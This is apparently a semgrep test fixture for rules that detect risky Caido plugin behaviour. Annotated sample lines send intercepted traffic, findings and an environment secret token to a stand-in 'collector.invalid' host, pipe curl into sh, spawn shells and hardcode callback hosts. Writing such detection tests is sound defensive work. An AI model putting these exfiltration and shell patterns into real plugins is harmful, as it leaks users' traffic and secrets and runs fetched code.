// Test cases for rules/caido.yml (semgrep --test). Not executable code.

export function init(sdk) {
  sdk.events.onInterceptResponse(async (sdk, request, response) => {
    // ruleid: caido-traffic-to-network, caido-hardcoded-external-url
    await fetch("https://collector.invalid/x", { method: "POST", body: request.getRaw().toText() });
  });

  sdk.events.onInterceptRequest((sdk, request) => {
    const raw = request.getRaw().toText();
    // ruleid: caido-traffic-to-network, caido-hardcoded-external-url
    navigator.sendBeacon("https://collector.invalid/b", raw);
  });

  sdk.events.onInterceptResponse(async function (sdk, request, response) {
    // ruleid: caido-traffic-to-network, caido-hardcoded-external-url
    fetch("https://collector.invalid/f?d=" + response.getBody().toText());
  });

  sdk.backend.onEvent("finding", (finding) => {
    // ruleid: caido-traffic-to-network, caido-hardcoded-external-url
    fetch("https://collector.invalid/e", { body: JSON.stringify(finding) });
  });

  async function dump() {
    const page = await sdk.requests.query().first(100).execute();
    // ruleid: caido-traffic-to-network, caido-hardcoded-external-url
    await fetch("https://collector.invalid/q", { method: "POST", body: JSON.stringify(page) });
  }

  // ruleid: caido-traffic-to-network, caido-hardcoded-external-url
  fetch("https://collector.invalid/env?t=" + process.env.SECRET_TOKEN);

  sdk.events.onInterceptRequest((sdk, request) => {
    // ok: caido-traffic-to-network
    // ruleid: caido-hardcoded-external-url
    fetch("https://api.example.invalid/static");
  });
}

// ruleid: caido-backend-dangerous-module
const cp = require("child_process");
// ruleid: caido-backend-dangerous-module
import { spawn } from "node:child_process";
// ok: caido-backend-dangerous-module
const path = require("path");

// ruleid: caido-hardcoded-external-url
const u1 = "https://collector.invalid/x";
// ok: caido-hardcoded-external-url
const u2 = "https://api.github.com/repos/caido/store";
// ok: caido-hardcoded-external-url
const u3 = "http://localhost:8080/";

// caido-secret-in-url
export async function license(BASE, type, key, token, pw, term, n) {
  // ruleid: caido-secret-in-url
  const u1 = `${BASE}?type=${encodeURIComponent(type)}&licenseKey=${encodeURIComponent(key)}`;
  // ruleid: caido-secret-in-url
  const u2 = BASE + "?token=" + token;
  const url = new URL(BASE);
  // ruleid: caido-secret-in-url
  url.searchParams.set("api_key", key);
  // ruleid: caido-secret-in-url
  const q = new URLSearchParams({ q: term, password: pw });
  // ok: caido-secret-in-url
  await fetch(BASE, { headers: { Authorization: `Bearer ${token}` } });
  // ok: caido-secret-in-url
  const u3 = `${BASE}?page=${n}&tokens=10`;
  // ok: caido-secret-in-url
  url.searchParams.set("page", n);
  return [u1, u2, q, u3];
}

// caido-make-executable
import { chmod } from "fs/promises";
import * as fs from "fs";
export async function install(binPath, Q, i, w) {
  // ruleid: caido-make-executable
  await chmod(binPath, 493);
  // ruleid: caido-make-executable
  fs.chmodSync(binPath, 0o755);
  // ruleid: caido-make-executable
  await fs.promises.chmod(binPath, "755");
  // ok: caido-make-executable
  Q.chmod(i, w | 146);
}

// caido-dynamic-shell-command
import * as cp from "child_process";
// ruleid: caido-backend-dangerous-module
import { spawn, exec } from "child_process";
export function run(cmd, re, text) {
  // ruleid: caido-dynamic-shell-command
  spawn(cmd, [], { shell: true });
  // ruleid: caido-dynamic-shell-command
  cp.execFile(cmd, { shell: !0 });
  // ruleid: caido-dynamic-shell-command
  exec(`curl ${cmd} | sh`);
  // ruleid: caido-dynamic-shell-command
  cp.execSync(cmd);
  // ok: caido-dynamic-shell-command
  spawn("git", ["status"], { shell: true });
  // ok: caido-dynamic-shell-command
  spawn(cmd, ["--version"]);
  // ok: caido-dynamic-shell-command
  exec("ls -la");
  // ok: caido-dynamic-shell-command
  re.exec(text);
}

// caido-hardcoded-callback-url, caido-request-data-to-callback-url
// Shape of a real plugin: request host/path end up in a probe URL on a fixed callback host
export class ProbeModule {
  constructor(sdk) {
    this.sdk = sdk;
    // ruleid: caido-hardcoded-callback-url, caido-hardcoded-external-url
    this.callbackUrl = "https://request-spy.collector.invalid";
  }
  setCallbackUrl(url) {
    // ok: caido-hardcoded-callback-url
    this.callbackUrl = url;
  }
  async sendProbe(request) {
    const originalBody = await request.text();
    const originalHost = request.host;
    const uniquePath = `/${originalHost}/${Date.now()}`;
    // ruleid: caido-request-data-to-callback-url
    const probeUrl = new URL(uniquePath, this.callbackUrl);
    return fetch(new Request(request.url.toString(), { body: originalBody.replace("x", probeUrl.toString()) }));
  }
  probeConstant() {
    // ok: caido-request-data-to-callback-url
    return new URL("/static-test", this.callbackUrl);
  }
}
export async function userConfiguredOast(request, settings) {
  // ruleid: caido-request-data-to-callback-url
  return settings.oastHost + request.getHost();
}
// ruleid: caido-hardcoded-callback-url
export function interact(host, oastDomain = "oast.collector.invalid") { return host + oastDomain; }
// ruleid: caido-hardcoded-callback-url
export const defaults = { webhookUrl: "hooks.collector.invalid/x" };
// ok: caido-hardcoded-callback-url
export const empty = { webhookUrl: "" };
// ok: caido-hardcoded-callback-url
export let callbackHost = "localhost:8080";
// ruleid: caido-hardcoded-callback-url
export const defaultCallbackDomain = "cb.collector.invalid";
// ok: caido-hardcoded-callback-url
export const onCallback = () => "done";
